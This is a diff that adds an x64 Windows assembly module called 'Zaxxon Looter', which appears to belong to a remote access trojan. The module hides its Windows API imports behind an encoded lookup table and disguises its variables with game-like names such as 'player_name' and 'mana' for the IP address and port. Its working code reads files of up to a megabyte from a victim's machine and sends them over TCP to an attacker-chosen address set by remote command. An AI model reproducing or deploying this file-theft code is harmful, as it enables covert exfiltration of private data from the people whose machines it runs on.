@@ -1,0 +1,522 @@
+#!name##ZAX_LOOT
+#!types##sfile
+#!info##Zaxxon Looter func module
+
+
+
+
+extern atoi
+
+
+
+%define LOOT_MEGA_BYTE 1024 * 1024
+%define LOOT_OPEN_FILE_BUFF 1 * LOOT_MEGA_BYTE
+%define LOOT_WAITING_TIME 3000  ; waiting time in the queue for connection
+
+{% set PFL_base = TOOL.AsmSh_make_table(data=PF_text, set_as_default=True)%}
+
+section .data
+    exs_text_sxs: db "Extra Socket has been set.", 10, 0
+    exs_text_ens: db "Error extra socket is not set", 10, 0
+    
+    lot_player_cfa: dd {{TOOL.AsmSh_encode("CreateFileA")}} ; CreateFileA
+    lot_player_rf: dd {{TOOL.AsmSh_encode("ReadFile")}} ; ReadFile
+    lot_player_ct: dd {{TOOL.AsmSh_encode("CreateThread")}} ; CreateThread
+    lot_player_wso: dd {{TOOL.AsmSh_encode("WaitForSingleObject")}} ; WaitForSingleObject
+
+{% set _ = TOOL.AsmSh_reset_table() %}    
+
+section .bss
+    exsock_ws_struct: resb 400   ; wsa data struct
+    exsock_socket_fd: resq 1   ; socket file descriptor
+    exsock_addr_struct: resb 16  ; sock_addr struct 16 bytes
+    exsock_is_conn: resb 1  ; is connected FLAG
+    loot_opf_buff: resb LOOT_OPEN_FILE_BUFF
+    loot_opf_buff_count: resq 1 ; buffer stores the number of bytes written
+    exsock_player_name_str: resb 16 ; string ip addr
+    exsock_player_name: resb 16 ; extra sock ip addr
+    exsock_player_mana_str: resb 8  ; extra sock string port number
+    exsock_player_mana: resq 1  ; extra sock port num
+    exsock_flag_tconn: resb 1   ; 'Try conn FLAG'
+    loot_main_enemy: resq 1     ; CreateThread addr
+    loot_sec_enemy: resq 1      ; WaitForSingleObject addr
+
+    
+section .text
+
+LOOT_send:
+; create Thread send file
+; REQUIREMENTS: stack allign to 16
+; IN: rcx - file path
+    push rbp
+    mov rbp, rsp
+    sub rsp, 24
+    mov [rbp-8], rcx    ; file path
+    
+    
+    ;create thread
+    sub rsp, 56
+    mov rcx, 0
+    mov rdx, 0
+    mov r8, LOOT_sendf
+    mov r9, [rbp-8]
+    mov qword [rsp+32], 0
+    mov qword [rsp+40], 0
+    lea rax, [loot_main_enemy]
+    mov rax, [rax]
+    call rax    ; call CreateThread
+    add rsp, 56
+    
+    
+    sub rsp, 40
+    mov rcx, rax
+    mov rdx, -1
+    lea rbx, [loot_sec_enemy]
+    mov rbx, [rbx]
+    call rbx    ; call WaitForSingleObject
+    add rsp, 40
+    
+    
+    .return:
+        add rsp, 24
+        pop rbp
+        ret
+
+
+
+LOOT_Init:
+; Initialize module
+; REQUIREMENTS: stack allign to 16
+    push rbp
+    mov rbp, rsp
+    sub rsp, 8
+    
+    sub rsp, 40
+    mov rcx, lot_player_ct
+    mov rdx, 0
+    call PITF_get
+    lea rbx, [loot_main_enemy]
+    mov [rbx], rax
+    mov rcx, lot_player_wso
+    mov rdx, 0
+    call PITF_get
+    lea rbx, [loot_sec_enemy]
+    mov [rbx], rax
+    add rsp, 40
+    
+    ;reset FLAG
+    lea rcx, [exsock_flag_tconn]
+    mov byte [rcx], 0
+    
+    
+    add rsp, 8
+    pop rbp
+    ret
+
+LOOT_sendf:
+; send file
+; REQUIREMENTS: stack allign to 16
+; IN: rcx - file path
+; IN: rdx - 0
+    push rbp
+    mov rbp, rsp
+    sub rsp, 24
+    mov [rbp-8], rcx    ; file path
+    mov [rbp-16], rdx
+    
+    
+    .check_flag:
+    ; check if try connect
+        lea rcx, [exsock_flag_tconn]
+        mov byte cl, [rcx]
+        cmp cl, 0
+        jne .waiting
+    
+    ; check params
+    xor rbx, rbx
+    lea rcx, [exsock_player_name_str]
+    mov byte bl, [rcx]
+    cmp bl, 0
+    je .error_set
+    
+    ; load file
+    sub rsp, 40
+    mov rcx, [rbp-8]
+    mov rdx, 0
+    call LOOT_readf
+    add rsp, 40
+    cmp rax, 0
+    je .return_false
+    mov [rbp-16], rax   ; data file pointer
+    
+    
+    
+    ;build socket
+    sub rsp, 40
+    lea rcx, [exsock_player_name_str]
+    lea rdx, [exsock_player_mana]
+    mov rdx, [rdx] 
+    call EXSOCK_create
+    add rsp, 40
+    
+    ; send data
+    sub rsp, 40
+    mov rcx, mtcp_item_sd
+    mov rdx, mtcp_item_player
+    call PITF_get
+    lea rcx, [exsock_socket_fd]
+    mov rcx, [rcx]
+    mov rdx, [rbp-16]
+    lea r8, [loot_opf_buff_count]
+    mov r8, [r8]
+    mov r9, 0
+    call rax    ; call send
+    add rsp, 40
+    
+    
+    ;close socket
+    sub rsp, 40
+    call EXSOCK_close
+    add rsp, 40
+    
+    
+    .return:
+        add rsp, 24
+        pop rbp
+        ret
+    
+    .return_false:
+        xor rax, rax
+        jmp .return
+    
+    .error_set:
+        sub rsp, 40
+        mov rcx, exs_text_ens
+        call TCP_send
+        add rsp, 40
+        jmp .return_false
+
+    .waiting:
+        sub rsp, 40
+        mov rcx, LOOT_WAITING_TIME
+        lea rax, [mtcp_pl_wait]
+        mov rax, [rax]
+        call rax    ; call Sleep
+        add rsp, 40
+        jmp .check_flag
+        
+
+
+EXSOCK_create:
+; create extra socket
+; REQUIREMENTS: stack allign to 16
+; IN: rcx - ip addr
+; IN: rdx - port num
+    push rbp
+    mov rbp, rsp
+    sub rsp, 24
+    mov [rbp-8], rcx    ; ip addr
+    mov [rbp-16], rdx   ; port num
+    
+    lea rcx, [exsock_flag_tconn]
+    mov byte [rcx], 1    ; set 'try conn' FLAG
+    
+    ;create socket
+    .create:
+        sub rsp, 40 ;shadow space
+        mov rcx, mtcp_item_so
+        mov rdx, mtcp_item_player
+        call PITF_get
+        mov rcx, 2  ;AF_INET    ;The address family specification.
+        mov rdx, 1  ;SOCK_STREAM    ; The type specification for the new socket.
+        mov r8, 6   ; IPPROTO_TCP ;The protocol to be used.
+        call rax    ; call socket
+        add rsp, 40 ;restore stack
+        cmp rax, -1
+        je .error
+        lea rcx, [exsock_socket_fd]
+        mov [rcx], rax  ; save socket fd
+        
+        
+    .config_sock:
+        ;   struct sockaddr_in {
+        ;       short   sin_family; 2 bytes
+        ;       u_short sin_port;   2 bytes
+        ;       struct  in_addr sin_addr; 4 bytes
+        ;       char    sin_zero[8];
+        ;      };
+        
+        ; SIN_FAMILY
+        lea rcx, [exsock_addr_struct]
+        mov qword [rcx], 2  ;AF_INET
+        
+        ; SIN_PORT
+        sub rsp, 40 ;shadow space
+        mov rcx, mtcp_item_ht
+        mov rdx, mtcp_item_player
+        call PITF_get
+        mov rcx, [rbp-16]
+        call rax    ; call htons
+        lea rcx, [exsock_addr_struct]
+        mov [rcx + 2], rax  ; save sin_port to struct
+        
+        ; IP ADDR
+        mov rcx, mtcp_item_ia
+        mov rdx, mtcp_item_player
+        call PITF_get
+        mov rcx, [rbp-8]
+        call rax    ; call inet_addr
+        lea rcx, [exsock_addr_struct]
+        mov [rcx+4], rax    ; save ip addr to struct
+        add rsp, 40 ;restore stack
+        
+        
+    .connect:
+    ; reset 'is connected' FLAG
+        lea rcx, [exsock_is_conn]
+        mov byte [rcx], 0
+        
+        sub rsp, 40 ;shadow space  
+        ; try connect
+        mov rcx, mtcp_item_co
+        mov rdx, mtcp_item_player
+        call PITF_get
+        lea rcx, [exsock_socket_fd]
+        mov rcx, [rcx]
+        lea rdx, [exsock_addr_struct]
+        mov r8, 16  ; length sock_addr struct
+        call rax    ; call connect
+        add rsp, 40 ; restore stack
+        cmp rax, 0
+        jne .error_conn
+            
+
+        ; set 'is connected' FLAG
+        lea rcx, [exsock_is_conn]
+        mov byte [rcx], 1
+        mov rax, 1  ;return True
+    
+    
+    
+    .return:
+        add rsp, 24
+        pop rbp
+        ret
+    
+    .error:
+        lea rcx, [exsock_flag_tconn]
+        mov byte [rcx], 0    ; reset 'try conn' FLAG
+        xor rax, rax    ; return False
+        jmp .return
+
+    .error_conn:
+        sub rsp, 40
+        mov rcx, TCP_SOCKET_CONNECTION_PAUSE
+        lea rax, [mtcp_pl_wait]
+        mov rax, [rax]
+        call rax    ; call Sleep
+        add rsp, 40
+        jmp .connect
+
+
+EXSOCK_close:
+; close socket
+; REQUIREMENTS: stack allign to 16
+    push rbp
+    mov rbp, rsp
+    sub rsp, 8
+    
+    sub rsp, 40
+    mov rcx, mtcp_item_cs
+    mov rdx, mtcp_item_player
+    call PITF_get
+    lea rcx, [exsock_socket_fd]
+    mov rcx, [rcx]
+    call rax    ; call closesocket
+    add rsp, 40
+    
+    ; reset 'try connect' FLAG
+    lea rcx, [exsock_flag_tconn]
+    mov byte [rcx], 0
+    
+    
+    add rsp, 8
+    pop rbp
+    ret
+;;;;;;;;;;;;;;;;;;;;; FILE FUNCTION ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+LOOT_readf:
+; open and read file
+; REQUIREMENTS: stack allign to 16
+; IN: rcx - file path
+; IN: rdx - buffer or "0" (use default buff)
+; OUT: rax - pointer to buffer (True) or 0 (False)
+    push rbp
+    mov rbp, rsp
+    sub rsp, 24
+    mov [rbp-8], rcx    ; file path
+    mov [rbp-16], rdx   ; buffer
+    
+    cmp rdx, 0
+    je .load_default_buff
+    
+    .begin:
+        sub rsp, 72
+        mov rcx, lot_player_cfa
+        mov rdx, 0
+        call PITF_get
+        mov rcx, [rbp-8]
+        mov rdx, 0x80000000 ; GENERIC_READ
+        mov r8, 0x00000001  ; FILE_SHARE_READ
+        mov r9, 0
+        mov qword [rsp+32], 3 ;OPEN_EXISTING
+        mov qword [rsp+40], 0x00000080
+        mov qword [rsp+48], 0
+        call rax    ; call CreateFileA
+        add rsp, 72
+        
+        cmp rax, -1
+        je .return_null
+        
+        ; save file handle
+        mov [rbp-8], rax
+
+        sub rsp, 56
+        mov rcx, lot_player_rf
+        mov rdx, 0
+        call PITF_get
+        mov rcx, [rbp-8]    ; opened file handle
+        mov rdx, [rbp-16]   ; read buffer
+        mov r8, LOOT_OPEN_FILE_BUFF     ; number bytes to read
+        lea r9, [loot_opf_buff_count]   ; bytes count buffer
+        mov qword [rsp+32], 0 ; NULL
+        call rax    ; call ReadFile
+        add rsp, 56
+        
+        mov rax, [rbp-16]   ;return pointer
+
+    .return:
+        add rsp, 24
+        pop rbp
+        ret
+    
+    .load_default_buff:
+    ; clear buff
+        xor rax, rax
+        lea rdi, [loot_opf_buff]    ; target buff
+        mov rcx, LOOT_OPEN_FILE_BUFF    ; count number
+        mov al, 0   ; data
+        cld ; direction
+        rep stosb
+        lea rax, [loot_opf_buff]    ; default buffer
+        mov [rbp-16], rax   
+        jmp .begin
+        
+    .return_null:
+        xor rax, rax
+        jmp .return
+        
+        
+
+;;;;;;;;;;;;;;;;;;;;; SETUP EXTRA SOCKET ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+LOOT_set_explayer:
+; set extra socket addr and port
+; REQUIREMENTS: stack allign to 16
+; IN: rcx - 4 * struct
+    push rbp
+    mov rbp, rsp
+    sub rsp, 24
+    mov rbx, rcx
+    
+    sub rsp, 40
+    mov rcx, [rbx+8]
+    mov rdx, [rbx+16]
+    call LOOT_setup_explayer
+    mov rcx, exs_text_sxs
+    call TCP_send
+    add rsp, 40
+    
+    
+    .return:
+        add rsp, 24
+        pop rbp
+        ret
+
+LOOT_setup_explayer:
+; setup extra socket
+; REQUIREMENTS: stack allign to 16
+; IN: rcx - ip addr
+; IN: rdx - port number
+    push rbp
+    mov rbp, rsp
+    sub rsp, 24
+    mov [rbp-8], rcx    ; ip addr
+    mov [rbp-16], rdx   ; port num
+    
+    
+    ; clear exsock_player_name_str
+    lea rdi, [exsock_player_name_str]
+    mov rcx, 16
+    xor rax, rax
+    cld ; direction FLAG
+    rep stosb
+    
+    ; clear exsock_player_name
+    lea rdi, [exsock_player_name]
+    mov rcx, 16
+    xor rax, rax
+    cld ; direction FLAG
+    rep stosb
+    
+    ; clear exsock_player_mana_str
+    lea rdi, [exsock_player_mana_str]
+    mov rcx, 8
+    xor rax, rax
+    cld ; direction FLAG
+    rep stosb
+ 
+    ; copy ip string ip addr
+    mov rsi, [rbp-8]
+    lea rdi, [exsock_player_name_str]
+    xor rax, rax    ; temp
+    xor rbx, rbx    ; counter
+    .copy_ipstr_loop:
+        mov byte al, [rsi+rbx]
+        cmp al, 0
+        je .copy_port
+        mov byte [rdi+rbx], al
+        inc rbx
+        jmp .copy_ipstr_loop
+
+    .copy_port:
+        ; copy port number
+        xor rax, rax    ; temp
+        xor rbx, rbx    ; counter
+        mov rsi, [rbp-16]
+        lea rdi, [exsock_player_mana_str]
+    .copy_port_num:
+        mov byte al, [rsi+rbx]
+        cmp al, 0
+        je .convert2int
+        mov byte [rdi+rbx], al
+        inc rbx
+        jmp .copy_port_num
+    
+    ; convert to int
+    .convert2int:
+        sub rsp, 40
+        lea rcx, [exsock_player_mana_str]
+        call atoi
+        add rsp, 40
+        lea rbx, [exsock_player_mana]
+        mov [rbx], rax
+
+    .return:
+        add rsp, 24
+        pop rbp
+        ret
+
+
+
+
